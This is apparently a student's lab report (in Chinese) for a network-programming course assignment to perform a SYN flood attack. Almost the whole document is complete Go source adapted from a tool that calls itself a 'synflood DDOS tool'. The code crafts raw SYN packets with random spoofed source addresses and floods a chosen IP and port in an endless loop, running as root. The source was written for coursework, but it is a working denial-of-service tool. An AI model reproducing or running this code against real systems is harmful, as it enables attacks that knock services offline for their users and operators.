# syn_blood

以word或PDF文档格式提交，文件名命名为“网络编程（周三或周五）第2次上机作业+姓名+学号.docx”，发到312066202@qq.com邮箱，要求完成一个SYN洪水攻击实验，可参考第4章的ppt第22页的网页链接或自己百度
，附上运行结果及核心代码，编程语言及平台不限，最迟提交时间为本学期结束的最后一周。

# 实验环境说明

基于go1.8实现
主要参考了github仓库 https://github.com/rootVIII/gosynflood
## 代码实现

```go
package main

/*
 rootVIII gosynflood - synflood DDOS tool
 2020
*/

import (
 "crypto/rand"
 "flag"
 "fmt"
 "net"
 "os"
 "os/user"
 "reflect"
 "strconv"
 "strings"
)

// SYNPacket represents a TCP packet.
type SYNPacket struct {
 Payload   []byte
 TCPLength uint16
 Adapter   string
}

func (s SYNPacket) randByte() byte {
 randomUINT8 := make([]byte, 1)
 rand.Read(randomUINT8)
 return randomUINT8[0]
}

func (s SYNPacket) invalidFirstOctet(val byte) bool {
 return val == 0x7F || val == 0xC0 || val == 0xA9 || val == 0xAC
}

func (s SYNPacket) leftshiftor(lval uint8, rval uint8) uint32 {
 return (uint32)(((uint32)(lval) << 8) | (uint32)(rval))
}

// TCPIP represents the IP header and TCP segment in a TCP packet.
type TCPIP struct {
 VersionIHL    byte
 TOS           byte
 TotalLen      uint16
 ID            uint16
 FlagsFrag     uint16
 TTL           byte
 Protocol      byte
 IPChecksum    uint16
 SRC           []byte
 DST           []byte
 SrcPort       uint16
 DstPort       uint16
 Sequence      []byte
 AckNo         []byte
 Offset        uint16
 Window        uint16
 TCPChecksum   uint16
 UrgentPointer uint16
 Options       []byte
 SYNPacket     `key:"SYNPacket"`
}

func (tcp *TCPIP) calcTCPChecksum() {
 var checksum uint32 = 0
 checksum = tcp.leftshiftor(tcp.SRC[0], tcp.SRC[1]) + tcp.leftshiftor(tcp.SRC[2], tcp.SRC[3])
 checksum += tcp.leftshiftor(tcp.DST[0], tcp.DST[1]) + tcp.leftshiftor(tcp.DST[2], tcp.DST[3])
 checksum += uint32(tcp.SrcPort)
 checksum += uint32(tcp.DstPort)
 checksum += uint32(tcp.Protocol)
 checksum += uint32(tcp.TCPLength)
 checksum += uint32(tcp.Offset)
 checksum += uint32(tcp.Window)

 carryOver := checksum >> 16
 tcp.TCPChecksum = 0xFFFF - (uint16)((checksum<<4)>>4+carryOver)

}

func (tcp *TCPIP) setPacket() {
 tcp.TCPLength = 0x0028
 tcp.VersionIHL = 0x45
 tcp.TOS = 0x00
 tcp.TotalLen = 0x003C
 tcp.ID = 0x0000
 tcp.FlagsFrag = 0x0000
 tcp.TTL = 0x40
 tcp.Protocol = 0x06
 tcp.IPChecksum = 0x0000
 tcp.Sequence = make([]byte, 4)
 tcp.AckNo = tcp.Sequence
 tcp.Offset = 0xA002
 tcp.Window = 0xFAF0
 tcp.UrgentPointer = 0x0000
 tcp.Options = make([]byte, 20)
 tcp.calcTCPChecksum()
}

func (tcp *TCPIP) setTarget(ipAddr string, port uint16) {
 for _, octet := range strings.Split(ipAddr, ".") {
  val, _ := strconv.Atoi(octet)
  tcp.DST = append(tcp.DST, (uint8)(val))
 }
 tcp.DstPort = port
}

func (tcp *TCPIP) genIP() {
 firstOct := tcp.randByte()
 for tcp.invalidFirstOctet(firstOct) {
  firstOct = tcp.randByte()
 }

 tcp.SRC = []byte{firstOct, tcp.randByte(), tcp.randByte(), tcp.randByte()}
 tcp.SrcPort = (uint16)(((uint16)(tcp.randByte()) << 8) | (uint16)(tcp.randByte()))
 for tcp.SrcPort <= 0x03FF {
  tcp.SrcPort = (uint16)(((uint16)(tcp.randByte()) << 8) | (uint16)(tcp.randByte()))
 }
}

func exitErr(reason error) {
 fmt.Println(reason)
 os.Exit(1)
}

func main() {
 user, err := user.Current()
 fmt.Println(user.Username)
 if err != nil || user.Username != "root" {
  exitErr(fmt.Errorf("Root privileges required for execution"))
 }

 target := flag.String("t", "", "Target IPV4 address")
 tport := flag.Uint("p", 0x0050, "Target Port")
 ifaceName := flag.String("i", "", "Network Interface")
 flag.Parse()

 if len(*target) < 1 || net.ParseIP(*target) == nil {
  exitErr(fmt.Errorf("required argument: -t <target IP addr>"))
 }
 if strings.Count(*target, ".") != 3 || strings.Contains(*target, ":") {
  exitErr(fmt.Errorf("invalid IPV4 address: %s", *target))
 }
 if *tport > 0xFFFF {
  exitErr(fmt.Errorf("invalid port: %d", *tport))
 }

 var packet = &TCPIP{}
 var foundIface bool = false
 foundIfaces := packet.getInterfaces()
 for _, name := range foundIfaces {
  if name != *ifaceName {
   continue
  }
  foundIface = true
 }

 if !foundIface {
  msg := "Invalid argument for -i <interface> Found: %s"
  errmsg := fmt.Errorf(msg, strings.Join(foundIfaces, ", "))
  exitErr(errmsg)
 }

 defer func() {
  if err := recover(); err != nil {
   exitErr(fmt.Errorf("error: %v", err))
  }
 }()

 packet.setTarget(*target, uint16(*tport))
 packet.genIP()
 packet.setPacket()

 packet.floodTarget(
  reflect.TypeOf(packet).Elem(),
  reflect.ValueOf(packet).Elem(),
 )
}

package main

import (
 "strings"
 "unsafe"
)
/*

#define _GNU_SOURCE
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netdb.h>
#include <ifaddrs.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <linux/if_link.h>
#include <string.h>
#include <limits.h>


char* getifaces()
{
    struct ifaddrs *ifaddr, *ifa;
    int family, s;
    char host[NI_MAXHOST];
    int newlen = 0;
    char* interfaces = (char*) malloc(4);
    char* joined = NULL;
    if (getifaddrs(&ifaddr) == -1) {
        free(interfaces);
        perror("getifaddrs");
        exit(EXIT_FAILURE);
    }
    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL)
            continue;
        family = ifa->ifa_addr->sa_family;
        if (family == AF_INET || family == AF_INET6) {
            s = getnameinfo(ifa->ifa_addr,
                    (family == AF_INET) ? sizeof(struct sockaddr_in) :
                                            sizeof(struct sockaddr_in6),
                    host, NI_MAXHOST,
                    NULL, 0, NI_NUMERICHOST);
            newlen = strlen(ifa->ifa_name) + 2;
            joined = malloc(newlen * sizeof(char*));
            strcpy(joined, ifa->ifa_name);
            strcat(joined, ",");
            interfaces = realloc(interfaces, newlen * sizeof(char*));
            strcat(interfaces, joined);
            free(joined);
        }
    }
    freeifaddrs(ifaddr);
    return interfaces;
}

*/
import "C"

// getInterfaces binds to the C getifaces() function.
func (tcp TCPIP) getInterfaces() []string {
 ifacesPTR := C.getifaces()
 var ifaces string = C.GoString(ifacesPTR)
 defer C.free(unsafe.Pointer(ifacesPTR))
 var interfaces []string
 for _, adapter := range strings.Split(ifaces, ",") {
  if len(adapter) < 1 {
   continue
  }
  isDup := false
  for _, ifaceName := range interfaces {
   if ifaceName != adapter {
    continue
   }
   isDup = true
   break
  }
  if !isDup {
   interfaces = append(interfaces, adapter)
  }
 }
 return interfaces
}

package main

import (
 "fmt"
 "reflect"
 "syscall"
)

func (tcp TCPIP) rawSocket(descriptor int, sockaddr syscall.SockaddrInet4) {
 err := syscall.Sendto(descriptor, tcp.Payload, 0, &sockaddr)
 if err != nil {
  fmt.Println(err)
 } else {
  fmt.Printf(
   "Socket used:  %d.%d.%d.%d:%d\n",
   tcp.SRC[0], tcp.SRC[1], tcp.SRC[2], tcp.SRC[3], tcp.SrcPort,
  )
 }
}

func (tcp *TCPIP) floodTarget(rType reflect.Type, rVal reflect.Value) {

 var dest [4]byte
 copy(dest[:], tcp.DST[:4])
 fd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
 err := syscall.BindToDevice(fd, tcp.Adapter)
 if err != nil {
  panic(fmt.Errorf("bind to adapter %s failed: %v", tcp.Adapter, err))
 }

 addr := syscall.SockaddrInet4{
  Port: int(tcp.DstPort),
  Addr: dest,
 }

 for {
  tcp.genIP()
  tcp.calcTCPChecksum()
  tcp.buildPayload(rType, rVal)
  tcp.rawSocket(fd, addr)
 }
}

func (tcp *TCPIP) buildPayload(t reflect.Type, v reflect.Value) {
 tcp.Payload = make([]byte, 60)
 var payloadIndex int = 0
 for i := 0; i < t.NumField(); i++ {
  field := t.Field(i)
  alias, _ := field.Tag.Lookup("key")
  if len(alias) < 1 {
   key := v.Field(i).Interface()
   keyType := reflect.TypeOf(key).Kind()
   switch keyType {
   case reflect.Uint8:
    tcp.Payload[payloadIndex] = key.(uint8)
    payloadIndex++
   case reflect.Uint16:
    tcp.Payload[payloadIndex] = (uint8)(key.(uint16) >> 8)
    payloadIndex++
    tcp.Payload[payloadIndex] = (uint8)(key.(uint16) & 0x00FF)
    payloadIndex++
   default:
    for _, element := range key.([]uint8) {
     tcp.Payload[payloadIndex] = element
     payloadIndex++
    }
   }
  }
 }
}

```

## 运行结果

![图 1](https://s2.loli.net/2022/05/24/fOcD7QPEMVjYAar.png)  
![图 2](https://s2.loli.net/2022/05/24/hwBZPRbpgOHaS56.png)  
